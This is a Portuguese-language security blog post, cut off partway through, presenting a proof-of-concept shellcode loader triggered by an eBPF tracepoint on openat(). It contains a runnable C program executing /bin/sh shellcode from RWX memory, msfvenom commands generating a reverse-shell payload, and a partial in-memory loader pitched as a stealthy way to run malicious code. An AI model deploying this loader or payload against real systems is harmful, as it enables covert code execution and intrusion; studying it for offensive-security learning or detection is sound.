@@ -1,0 +1,891 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+
+<head>
+  <title>
+  Shellcode Loader with eBPF · pwnbuffer
+</title>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="color-scheme" content="light dark">
+
+
+
+
+<meta name="author" content="pwnbuffer">
+<meta name="description" content="A simple and straightforward paper on the basic fundamentals of assembly!">
+<meta name="keywords" content="hack the planet!">
+
+
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Shellcode Loader with eBPF">
+  <meta name="twitter:description" content="A simple and straightforward paper on the basic fundamentals of assembly!">
+
+<meta property="og:url" content="https://pwnbuffer.org/posts/slayer/shellcode-loader-with-ebpf/">
+  <meta property="og:site_name" content="pwnbuffer">
+  <meta property="og:title" content="Shellcode Loader with eBPF">
+  <meta property="og:description" content="A simple and straightforward paper on the basic fundamentals of assembly!">
+  <meta property="og:locale" content="pt_br">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-06-08T00:00:00+00:00">
+    <meta property="article:modified_time" content="2025-06-08T00:00:00+00:00">
+    <meta property="article:tag" content="Low Level">
+    <meta property="article:tag" content="Programming">
+    <meta property="article:tag" content="Linux">
+
+
+
+
+<link rel="canonical" href="https://pwnbuffer.org/posts/slayer/shellcode-loader-with-ebpf/">
+
+
+<link rel="preload" href="https://pwnbuffer.org/fonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="https://pwnbuffer.org/fonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="https://pwnbuffer.org/fonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin>
+
+
+  
+  
+  <link rel="stylesheet" href="https://pwnbuffer.org/css/coder.min.b886fe0d9034709648f91f4ce178f51dd367d9350f82dd1132d54fd69bfca66f.css" integrity="sha256-uIb&#43;DZA0cJZI&#43;R9M4Xj1HdNn2TUPgt0RMtVP1pv8pm8=" crossorigin="anonymous" media="screen" />
+
+
+
+
+
+
+  
+    
+    
+    <link rel="stylesheet" href="https://pwnbuffer.org/css/coder-dark.min.165f5fe7c98269a5cfc54f81472e0f84ebc32d92bbe6c9db1f06962b0817bda1.css" integrity="sha256-Fl9f58mCaaXPxU&#43;BRy4PhOvDLZK75snbHwaWKwgXvaE=" crossorigin="anonymous" media="screen" />
+  
+
+
+
+ 
+
+
+
+
+<link rel="icon" type="image/svg+xml" href="https://pwnbuffer.org/img/favicon.svg" sizes="any">
+<link rel="icon" type="image/png" href="https://pwnbuffer.org/img/favicon-32x32.ico" sizes="32x32">
+<link rel="icon" type="image/png" href="https://pwnbuffer.org/img/favicon-16x16.ico" sizes="16x16">
+
+<link rel="apple-touch-icon" href="https://pwnbuffer.org/images/apple-touch-icon.png">
+<link rel="apple-touch-icon" sizes="180x180" href="https://pwnbuffer.org/images/apple-touch-icon.png">
+
+<link rel="manifest" href="https://pwnbuffer.org/site.webmanifest">
+<link rel="mask-icon" href="https://pwnbuffer.org/images/safari-pinned-tab.svg" color="#5bbad5">
+
+
+
+
+
+
+
+
+
+</head>
+
+
+
+
+
+
+<body class="preload-transitions colorscheme-dark">
+  
+
+  <main class="wrapper">
+    <nav class="navigation">
+  <section class="container">
+    
+    <a class="navigation-title" href="https://pwnbuffer.org/">
+      pwnbuffer
+    </a>
+    
+    
+      <input type="checkbox" id="menu-toggle" />
+      <label class="menu-button float-right" for="menu-toggle">
+        <i class="fa-solid fa-bars fa-fw" aria-hidden="true"></i>
+      </label>
+      <ul class="navigation-list">
+        
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="https://pwnbuffer.org/about/">Sobre</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="https://pwnbuffer.org/posts/">Artigos</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="https://pwnbuffer.org/categories/">Categorias</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="https://pwnbuffer.org/members/">Membros</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="https://pwnbuffer.org/contribute/">Contribua</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="https://pwnbuffer.org/wallpapers/">Wallpapers</a>
+            </li>
+          
+        
+        
+          
+          
+          
+            
+              
+                <li class="navigation-item menu-separator">
+                  <span>|</span>
+                </li>
+                
+              
+              <li class="navigation-item">
+                <a href="https://pwnbuffer.org/en/posts/slayer/shellcode-loader-with-ebpf/">🇺🇸</a>
+              </li>
+            
+          
+        
+      </ul>
+    
+  </section>
+</nav>
+
+
+    <div class="content">
+      
+  <section class="container post">
+    <article>
+      <header>
+        <div class="post-title">
+          <h1 class="title">
+            <a class="title-link" href="https://pwnbuffer.org/posts/slayer/shellcode-loader-with-ebpf/">
+              Shellcode Loader with eBPF
+            </a>
+          </h1>
+        </div>
+        <div class="post-meta">
+          <div class="date">
+            <span class="posted-on">
+              <i class="fa-solid fa-calendar" aria-hidden="true"></i>
+              <time datetime="2025-06-08T00:00:00Z">
+                junho 8, 2025
+              </time>
+            </span>
+            <span class="reading-time">
+              <i class="fa-solid fa-clock" aria-hidden="true"></i>
+              11 minutos de leitura
+            </span>
+          </div>
+          <div class="authors">
+  <i class="fa-solid fa-user" aria-hidden="true"></i>
+    <a href="https://pwnbuffer.org/authors/slayer/">Slayer</a></div>
+
+          <div class="categories">
+  <i class="fa-solid fa-folder" aria-hidden="true"></i>
+    <a href="https://pwnbuffer.org/categories/low-level/">Low-Level</a>
+      <span class="separator">•</span>
+    <a href="https://pwnbuffer.org/categories/linux/">Linux</a>
+      <span class="separator">•</span>
+    <a href="https://pwnbuffer.org/categories/kernel/">Kernel</a></div>
+
+          <div class="tags">
+  <i class="fa-solid fa-tag" aria-hidden="true"></i>
+    <span class="tag">
+      <a href="https://pwnbuffer.org/tags/low-level/">Low Level</a>
+    </span>
+      <span class="separator">•</span>
+    <span class="tag">
+      <a href="https://pwnbuffer.org/tags/programming/">Programming</a>
+    </span>
+      <span class="separator">•</span>
+    <span class="tag">
+      <a href="https://pwnbuffer.org/tags/linux/">Linux</a>
+    </span></div>
+
+        </div>
+      </header>
+
+      <div class="post-content">
+        
+        <hr>
+<h1 id="introdução">
+  Introdução
+  <a class="heading-link" href="#introdu%c3%a7%c3%a3o">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link para o cabeçalho"></i>
+    <span class="sr-only">Link para o cabeçalho</span>
+  </a>
+</h1>
+<p><strong>Nos ultimos anos, o Extended Berkeley Packet Filter (eBPF) emergiu como uma tecnologia bem poderosa dentro do kernel linux, permitidno a execução efeciente e segura de softwares customizados diretamente no kernel, sem a necessidade de modificar seu codigo fonte. Originalmente criado para o sniffing de pacotes, o eBPF evoluiu para uma plataforma de observabilidade, segurança e automação altamente versátil.</strong></p>
+<p><strong>Em paralelo, o shellcode se mantém como uma técnica clássica e ainda sim extremamente relevante dentro do &ldquo;arsenal&rdquo;. Shellcodes são trechos compactados de código em machine lang que realizam uma ação especifica, frequentemente usada para obter shells remotos, escalar privilegios ou explorar falhas.</strong></p>
+<p><strong>Neste paper, exploramos a integração entre eBPF e shellcode loaders, um campo pouco explorado. A ideia é utilizar o eBPF para monitorar eventos do sistema (como as famosas syscalls) e a partir disso, realizar um processo de execução de shellcode diretamente na memória no user-land. Essa abordagem fornece um meio altamente stealth de executar codigos maliciosos, aproveitando do baixo overhead do eBPF e da dificuldade de detecção de shellcodes injetados dinamicamente</strong></p>
+<p><strong>A proposta deste paper é demonstrar uma prova de conceito funcional de como isso pode ser feito, explicando cada parte do processo!</strong></p>
+<hr>
+<h1 id="1---objetivo">
+  1 - Objetivo
+  <a class="heading-link" href="#1---objetivo">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link para o cabeçalho"></i>
+    <span class="sr-only">Link para o cabeçalho</span>
+  </a>
+</h1>
+<p><strong>Este paper tem como objetivo principal demonstrar uma abordagem prátiac para a integração do kernel-land e o user-land, através de dois pontos centrais:</strong></p>
+<ul>
+<li>
+<p><strong>Interceptação de syscalls com eBPF -&gt; codar um programa eBPF anexado a um tracepoint do kernel para capturar eventos especificos, neste caso, a syscall <code>openat()</code>. Isso permnite monitorar em tempo real a atividade do ssitema, sem impacto significativo do desempenho, e com isolamento garantido pela sandbox do eBPF</strong></p>
+</li>
+<li>
+<p><strong>Carregamento e execução do shellcode em memória no user-land: após a ativação via event kernel, o programa em user-land é responsável por carregar um shellcode previamente compilado para a arquitetura <code>x64_86</code> em uma região executável da memória, usando o <code>mmap()</code> (mais pra frente, neste mesmo paper, vamos falar mais sobre ela). O shellcode então é executado diretamente na memória, dispensando a necessidade de arquivos temporários ou outros artefatos detectáveis</strong></p>
+</li>
+</ul>
+<hr>
+<h1 id="2---fundamentos">
+  2 - Fundamentos
+  <a class="heading-link" href="#2---fundamentos">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link para o cabeçalho"></i>
+    <span class="sr-only">Link para o cabeçalho</span>
+  </a>
+</h1>
+<h2 id="21---ebpf">
+  2.1 - eBPF
+  <a class="heading-link" href="#21---ebpf">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link para o cabeçalho"></i>
+    <span class="sr-only">Link para o cabeçalho</span>
+  </a>
+</h2>
+<p><strong>O eBPF (Extended Berkeley Packet Filter) é uma tecnologia do kernel linux que permite a execução segura de programas bytecode dentro do próprio kernel, de forma isolada e controlada. Originalmente projetado para filtragem de pacotes de rede, o eBPF evoluiu para uma plataforma generalizada capaz de monitorar e alterar o comportamento do sistema operacional em tempo real, sem necessidade de modificar ou reiniciar o kernel</strong></p>
+<p><strong>Os programas eBPF são escritos em uma linguagem restrita (normalmente C compilado para bytecode BPF via LLVM/Clang) e carregados no kernel usando a interface <code>bpf()</code> ou libs como a <code>libbpf</code>. Antes da execução, esse bytecode passa por um processo rigoroso de verificação para garantir que ele não cause instabilidade ou comprometa o kernel (por exemplo verificando loops infinitos ou acessos invalidos na memória)</strong></p>
+<p><strong>Os programas eBPF podem ser anexados a diversos pontos do kernel, como tracepoints, kprobes, uprobes, cgroups, sockets e etc.. permitindo a captura e manipulação de eventos do sistema!</strong></p>
+<h3 id="tracepoints-sys_enter_openat-no-caso">
+  tracepoints (sys_enter_openat no caso)
+  <a class="heading-link" href="#tracepoints-sys_enter_openat-no-caso">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link para o cabeçalho"></i>
+    <span class="sr-only">Link para o cabeçalho</span>
+  </a>
+</h3>
+<p><strong>No exemplo deste paper, utilizamos um tracepoint no kernel chamado <code>sys_enter_openat</code>, que é disparado toda vez que um processo executa a syscall <code>openat()</code>. Esse tracepoint fornece acesso aos argumentos da syscall (como o caminho do arquivo que está sendo aberto) no momento da invocação</strong></p>
+<p><strong>Anexar um programa eBPF a esse tracepoint permite interceptar essas informações de forma eficiente e segura, possibilitando, por exemplo, monitoramento detalhado de atividades de arquivos em tempo real!</strong></p>
+<h3 id="isolamento-do-ebpf">
+  Isolamento do eBPF
+  <a class="heading-link" href="#isolamento-do-ebpf">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link para o cabeçalho"></i>
+    <span class="sr-only">Link para o cabeçalho</span>
+  </a>
+</h3>
+<p><strong>O ambiente eBPF roda em sandbox, sem acesso direto a estruturas criticas do kernel, então isso reduz o risco de falhas e mantém a estabilidade do sistema, enquanto permite que ferramentas monitorem e interajam com o kernel de forma segura e eficaz</strong></p>
+<h2 id="22---shellcode">
+  2.2 - Shellcode
+  <a class="heading-link" href="#22---shellcode">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link para o cabeçalho"></i>
+    <span class="sr-only">Link para o cabeçalho</span>
+  </a>
+</h2>
+<p><strong>Shellcode é um pedaço de código que faz algo específico quando executado, geralmente usado em exploits para abrir um shell, executar comandos ou baixar payloads. Apesar do nome, nem todo shellcode abre um shell. Ele pode apenas criar arquivos, conectar em rede ou executar qualquer instrução válida</strong></p>
+<h3 id="como-caralhos-ele-é-executado">
+  Como caralhos ele é executado?
+  <a class="heading-link" href="#como-caralhos-ele-%c3%a9-executado">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link para o cabeçalho"></i>
+    <span class="sr-only">Link para o cabeçalho</span>
+  </a>
+</h3>
+<p><strong>O shellcode geralmente é injetado e executado em memória, então o processo é basicamente:</strong></p>
+<ul>
+<li><strong>1 -&gt; alocar memoria com permissão de execução (por exemplo: <code>mmap()</code> ou <code>malloc()</code> + <code>mprotect()</code>)</strong></li>
+<li><strong>2 -&gt; copiar o shellcode para essa memoria</strong></li>
+<li><strong>3 -&gt; criar uma função que aponta para o shellcode e chamar ela</strong></li>
+</ul>
+<p><strong>Bom, para exemplificar, aqui está um codigo em C bem simples que invoca uma shell sh por meio de um shellcode:</strong></p>
+
+
+
+
+
+<div class="tabs tabs-code tabs-left">
+  
+
+
+
+
+<style>
+  .tabs input#tab-0-0:checked ~ .tab-content-0-0 {
+    display: block;
+  }
+</style>
+
+<input type="radio" class="tab-input" name="tab-select-0" id="tab-0-0" checked/>
+<label for="tab-0-0" class="tab-label">C</label>
+<div class="tab-content tab-content-0-0">
+  <div class="highlight"><pre tabindex="0" style="color:#757575;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>#include &lt;stdio.h&gt;
+</span></span><span style="display:flex;"><span>#include &lt;string.h&gt;
+</span></span><span style="display:flex;"><span>#include &lt;sys/mman.h&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#5f5fff">unsigned</span> <span style="color:#5f5fff">char</span> shellcode[] <span style="color:#ec0000">=</span> {
+</span></span><span style="display:flex;"><span>  <span style="color:#008900">0x48</span>, <span style="color:#008900">0x31</span>, <span style="color:#008900">0xc0</span>, <span style="color:#008900">0x48</span>, <span style="color:#008900">0x89</span>, <span style="color:#008900">0xc2</span>, <span style="color:#008900">0x48</span>, <span style="color:#008900">0x89</span>, <span style="color:#008900">0xc6</span>, <span style="color:#008900">0x48</span>, <span style="color:#008900">0x8d</span>, <span style="color:#008900">0x3d</span>, <span style="color:#008900">0x04</span>, <span style="color:#008900">0x00</span>, <span style="color:#008900">0x00</span>, <span style="color:#008900">0x00</span>, <span style="color:#008900">0xb0</span>, <span style="color:#008900">0x3b</span>, <span style="color:#008900">0x0f</span>, <span style="color:#008900">0x05</span>, <span style="color:#008900">0x2f</span>, <span style="color:#008900">0x62</span>, <span style="color:#008900">0x69</span>, <span style="color:#008900">0x6e</span>, <span style="color:#008900">0x2f</span>, <span style="color:#008900">0x73</span>, <span style="color:#008900">0x68</span>, <span style="color:#008900">0x00</span>
+</span></span><span style="display:flex;"><span>};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#5f5fff">int</span> <span style="color:#5f5fff">main</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#5f5fff">void</span> <span style="color:#ec0000">*</span>mem <span style="color:#ec0000">=</span> <span style="color:#5f5fff">mmap</span>(<span style="color:#ec0000">NULL</span>, <span style="color:#008900">4096</span>,
+</span></span><span style="display:flex;"><span>    PROT_READ <span style="color:#ec0000">|</span> PROT_WRITE <span style="color:#ec0000">|</span> PROT_EXEC,
+</span></span><span style="display:flex;"><span>    MAP_ANON <span style="color:#ec0000">|</span> MAP_PRIVATE, <span style="color:#ec0000">-</span><span style="color:#008900">1</span>, <span style="color:#008900">0</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#5f5fff">memcpy</span>(mem, shellcode, <span style="color:#ec0000">sizeof</span>(shellcode));
+</span></span><span style="display:flex;"><span>    ((<span style="color:#5f5fff">void</span>(<span style="color:#ec0000">*</span>)())mem)();
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div>
+</div>
+
+
+
+
+</div>
+
+
+
+<h4 id="geração-com-o-msfvenom">
+  Geração com o msfvenom:
+  <a class="heading-link" href="#gera%c3%a7%c3%a3o-com-o-msfvenom">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link para o cabeçalho"></i>
+    <span class="sr-only">Link para o cabeçalho</span>
+  </a>
+</h4>
+<p><strong>Uma forma prática e rapida de gerar shellcodes é com o msfvenom, do metasploit, aqui vou deixar uns exemplos de como gerar shellcodes pelo msfvenom:</strong></p>
+<p><strong>gerar shellcode para uma reverse shell em x86_64;</strong>
+
+
+
+
+
+<div class="tabs tabs-code tabs-left">
+  
+
+
+
+
+<style>
+  .tabs input#tab-1-0:checked ~ .tab-content-1-0 {
+    display: block;
+  }
+</style>
+
+<input type="radio" class="tab-input" name="tab-select-1" id="tab-1-0" checked/>
+<label for="tab-1-0" class="tab-label">bash</label>
+<div class="tab-content tab-content-1-0">
+  <div class="highlight"><pre tabindex="0" style="color:#757575;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msfvenom -p linux/x64/shell_reverse_tcp <span style="color:#ec0000">LHOST</span><span style="color:#ec0000">=</span>127.0.0.1 <span style="color:#ec0000">LPORT</span><span style="color:#ec0000">=</span><span style="color:#008900">1337</span> -f c
+</span></span></code></pre></div>
+</div>
+
+
+
+
+</div>
+
+
+</p>
+<p><strong>isso gera o shellcode em formato C para ser copiado direto no código, mas você também pode gerar um shellcode &ldquo;puro&rdquo; em binário desta forma:</strong></p>
+
+
+
+
+
+<div class="tabs tabs-code tabs-left">
+  
+
+
+
+
+<style>
+  .tabs input#tab-2-0:checked ~ .tab-content-2-0 {
+    display: block;
+  }
+</style>
+
+<input type="radio" class="tab-input" name="tab-select-2" id="tab-2-0" checked/>
+<label for="tab-2-0" class="tab-label">bash</label>
+<div class="tab-content tab-content-2-0">
+  <div class="highlight"><pre tabindex="0" style="color:#757575;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msfvenom -p linux/x64/shell_reverse_tcp <span style="color:#ec0000">LHOST</span><span style="color:#ec0000">=</span>127.0.0.1 <span style="color:#ec0000">LPORT</span><span style="color:#ec0000">=</span><span style="color:#008900">1337</span> -f raw -o pwnbuffer.bin
+</span></span></code></pre></div>
+</div>
+
+
+
+
+</div>
+
+
+
+<h2 id="23---integração-com-loader">
+  2.3 - Integração com loader
+  <a class="heading-link" href="#23---integra%c3%a7%c3%a3o-com-loader">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link para o cabeçalho"></i>
+    <span class="sr-only">Link para o cabeçalho</span>
+  </a>
+</h2>
+<p><strong>Agora, levantamos uma questão: por que usar <code>mmap()</code> com <code>PROT_EXEC</code>? De forma direta, precisamos de uma região de memoria que possa executar código. O <code>mmap()</code> com <code>PROT_READ | PROT_WRITE | PROT_EXEC</code> permite alocar espaço onde copiamos o shellcode e conseguimos executar ele direto na RAM!</strong></p>
+<p><strong>eBPF exige que seus mapas e programas sejam travados na memória (sem swap), então o papel do <code>RLIMIT_MEMLOCK</code> é definir quanto de memória o processo pode travar, se for muito baixo, o <code>bpf()</code> falha com <code>EPERM</code>, por isso, aumetamos esse limite com:</strong></p>
+
+
+
+
+
+<div class="tabs tabs-code tabs-left">
+  
+
+
+
+
+<style>
+  .tabs input#tab-3-0:checked ~ .tab-content-3-0 {
+    display: block;
+  }
+</style>
+
+<input type="radio" class="tab-input" name="tab-select-3" id="tab-3-0" checked/>
+<label for="tab-3-0" class="tab-label">C</label>
+<div class="tab-content tab-content-3-0">
+  <div class="highlight"><pre tabindex="0" style="color:#757575;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#ec0000">struct</span> rlimit r <span style="color:#ec0000">=</span> {RLIM_INFINITY, RLIM_INFINITY};
+</span></span><span style="display:flex;"><span><span style="color:#5f5fff">setrlimit</span>(RLIMIT_MEMLOCK, <span style="color:#ec0000">&amp;</span>r);
+</span></span></code></pre></div>
+</div>
+
+
+
+
+</div>
+
+
+
+<p><strong>Sem isso, o loader nem carrega o eBPF.</strong></p>
+<hr>
+<h1 id="3---implementação">
+  3 - Implementação
+  <a class="heading-link" href="#3---implementa%c3%a7%c3%a3o">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link para o cabeçalho"></i>
+    <span class="sr-only">Link para o cabeçalho</span>
+  </a>
+</h1>
+<h2 id="31---code-ebpf-kernel-land">
+  3.1 - Code eBPF (kernel-land)
+  <a class="heading-link" href="#31---code-ebpf-kernel-land">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link para o cabeçalho"></i>
+    <span class="sr-only">Link para o cabeçalho</span>
+  </a>
+</h2>
+<p><strong>O seguinte code em C define o programa eBPF que será carregado no kernel e anexado ao tracepoint <code>sys_enter_openat</code>. Esse tracepoint é acionado sempre que um processo executa a syscall <code>openat()</code> usada internamente por funções como <code>open()</code> e <code>fopen()</code></strong></p>
+
+
+
+
+
+<div class="tabs tabs-code tabs-left">
+  
+
+
+
+
+<style>
+  .tabs input#tab-4-0:checked ~ .tab-content-4-0 {
+    display: block;
+  }
+</style>
+
+<input type="radio" class="tab-input" name="tab-select-4" id="tab-4-0" checked/>
+<label for="tab-4-0" class="tab-label">C</label>
+<div class="tab-content tab-content-4-0">
+  <div class="highlight"><pre tabindex="0" style="color:#757575;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>#include &lt;linux/bpf.h&gt;
+</span></span><span style="display:flex;"><span>#include &lt;bpf/bpf_helpers.h&gt;
+</span></span><span style="display:flex;"><span>#include &lt;linux/ptrace.h&gt;
+</span></span><span style="display:flex;"><span>#include &lt;linux/types.h&gt;
+</span></span><span style="display:flex;"><span>#include &lt;linux/stat.h&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ec0000">struct</span> trace_event {
+</span></span><span style="display:flex;"><span>    __u64           pad;
+</span></span><span style="display:flex;"><span>    <span style="color:#5f5fff">int</span>             dfd;
+</span></span><span style="display:flex;"><span>    <span style="color:#ec0000">const</span> <span style="color:#5f5fff">char</span>     <span style="color:#ec0000">*</span>filename;
+</span></span><span style="display:flex;"><span>    <span style="color:#5f5fff">int</span>             flags;      
+</span></span><span style="display:flex;"><span>    __u32           mode;
+</span></span><span style="display:flex;"><span>};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#5f5fff">char</span> LICENSE[] <span style="color:#5f5fff">SEC</span>(<span style="color:#008900">&#34;license&#34;</span>) <span style="color:#ec0000">=</span> <span style="color:#008900">&#34;GPL&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#5f5fff">SEC</span>(<span style="color:#008900">&#34;tracepoint/syscalls/sys_enter_openat&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#5f5fff">int</span> <span style="color:#5f5fff">trace_openat</span>(<span style="color:#ec0000">struct</span> trace_event <span style="color:#ec0000">*</span>ctx)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#5f5fff">char</span> first_byte <span style="color:#ec0000">=</span> <span style="color:#008900">0</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#5f5fff">bpf_probe_read_user</span>(<span style="color:#ec0000">&amp;</span>first_byte,
+</span></span><span style="display:flex;"><span>                       <span style="color:#ec0000">sizeof</span>(first_byte),
+</span></span><span style="display:flex;"><span>                       ctx<span style="color:#ec0000">-&gt;</span>filename);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#5f5fff">bpf_printk</span>(<span style="color:#008900">&#34;PWNED!! %c</span><span style="color:#008900">\n</span><span style="color:#008900">&#34;</span>, first_byte);
+</span></span><span style="display:flex;"><span>    <span style="color:#ec0000">return</span> <span style="color:#008900">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div>
+</div>
+
+
+
+
+</div>
+
+
+
+<p><strong>&ldquo;O que o código faz?&rdquo;</strong></p>
+<ul>
+<li><strong>intercepta chamadas para a <code>openat()</code></strong></li>
+<li><strong>lê o primeiro caractere do nome do arquivo sendo aberto</strong></li>
+<li><strong>usa <code>bpf_printk()</code> para registrar no <code>/sys/kernel/debug/tracing/trace_pipe</code></strong></li>
+</ul>
+<p><strong>Então, isso permite monitorar em tempo real o que está sendo acessado pelo sistema sem hooks invasivos!</strong></p>
+<h2 id="32---code-loader-user-land">
+  3.2 - Code loader (user-land)
+  <a class="heading-link" href="#32---code-loader-user-land">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link para o cabeçalho"></i>
+    <span class="sr-only">Link para o cabeçalho</span>
+  </a>
+</h2>
+<p><strong>O loader é o programa em user-land responsável por carregar o eBPF no kernel, e logo após, carregar e executar um shellcode diretamente da memória! Aqui está o código do loader em C:</strong></p>
+
+
+
+
+
+<div class="tabs tabs-code tabs-left">
+  
+
+
+
+
+<style>
+  .tabs input#tab-5-0:checked ~ .tab-content-5-0 {
+    display: block;
+  }
+</style>
+
+<input type="radio" class="tab-input" name="tab-select-5" id="tab-5-0" checked/>
+<label for="tab-5-0" class="tab-label">C</label>
+<div class="tab-content tab-content-5-0">
+  <div class="highlight"><pre tabindex="0" style="color:#757575;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>#include &lt;stdio.h&gt;
+</span></span><span style="display:flex;"><span>#include &lt;stdlib.h&gt;
+</span></span><span style="display:flex;"><span>#include &lt;unistd.h&gt;
+</span></span><span style="display:flex;"><span>#include &lt;sys/mman.h&gt;
+</span></span><span style="display:flex;"><span>#include &lt;sys/resource.h&gt;
+</span></span><span style="display:flex;"><span>#include &lt;bpf/libbpf.h&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ec0000">static</span> <span style="color:#5f5fff">void</span> <span style="color:#5f5fff">bump_memlock_rlimit</span>(<span style="color:#5f5fff">void</span>)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#ec0000">struct</span> rlimit r <span style="color:#ec0000">=</span> { RLIM_INFINITY, RLIM_INFINITY };
+</span></span><span style="display:flex;"><span>    <span style="color:#ec0000">if</span> (<span style="color:#5f5fff">setrlimit</span>(RLIMIT_MEMLOCK, <span style="color:#ec0000">&amp;</span>r)) {
+</span></span><span style="display:flex;"><span>        <span style="color:#5f5fff">perror</span>(<span style="color:#008900">&#34;setrlimit(RLIMIT_MEMLOCK)&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#5f5fff">exit</span>(<span style="color:#008900">1</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ec0000">static</span> <span style="color:#5f5fff">void</span> <span style="color:#ec0000">*</span><span style="color:#5f5fff">load_shellcode</span>(<span style="color:#ec0000">const</span> <span style="color:#5f5fff">char</span> <span style="color:#ec0000">*</span>path)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    FILE <span style="color:#ec0000">*</span>f <span style="color:#ec0000">=</span> <span style="color:#5f5fff">fopen</span>(path, <span style="color:#008900">&#34;rb&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#ec0000">if</span> (<span style="color:#ec0000">!</span>f) {
+</span></span><span style="display:flex;"><span>        <span style="color:#5f5fff">perror</span>(<span style="color:#008900">&#34;fopen(shellcode)&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#5f5fff">exit</span>(<span style="color:#008900">1</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#5f5fff">fseek</span>(f, <span style="color:#008900">0</span>, SEEK_END);
+</span></span><span style="display:flex;"><span>    <span style="color:#5f5fff">size_t</span> size <span style="color:#ec0000">=</span> <span style="color:#5f5fff">ftell</span>(f);
+</span></span><span style="display:flex;"><span>    <span style="color:#5f5fff">rewind</span>(f);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#5f5fff">void</span> <span style="color:#ec0000">*</span>mem <span style="color:#ec0000">=</span> <span style="color:#5f5fff">mmap</span>(<span style="color:#ec0000">NULL</span>,
+</span></span><span style="display:flex;"><span>                     size,
+</span></span><span style="display:flex;"><span>                     PROT_READ <span style="color:#ec0000">|</span> PROT_WRITE <span style="color:#ec0000">|</span> PROT_EXEC,
+</span></span><span style="display:flex;"><span>                     MAP_ANONYMOUS <span style="color:#ec0000">|</span> MAP_PRIVATE,
+</span></span><span style="display:flex;"><span>                     <span style="color:#ec0000">-</span><span style="color:#008900">1</span>, <span style="color:#008900">0</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#ec0000">if</span> (mem <span style="color:#ec0000">==</span> MAP_FAILED) {
+</span></span><span style="display:flex;"><span>        <span style="color:#5f5fff">perror</span>(<span style="color:#008900">&#34;mmap&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#5f5fff">fclose</span>(f);
+</span></span><span style="display:flex;"><span>        <span style="color:#5f5fff">exit</span>(<span style="color:#008900">1</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ec0000">if</span> (<span style="color:#5f5fff">fread</span>(mem, <span style="color:#008900">1</span>, size, f) <span style="color:#ec0000">!=</span> size) {
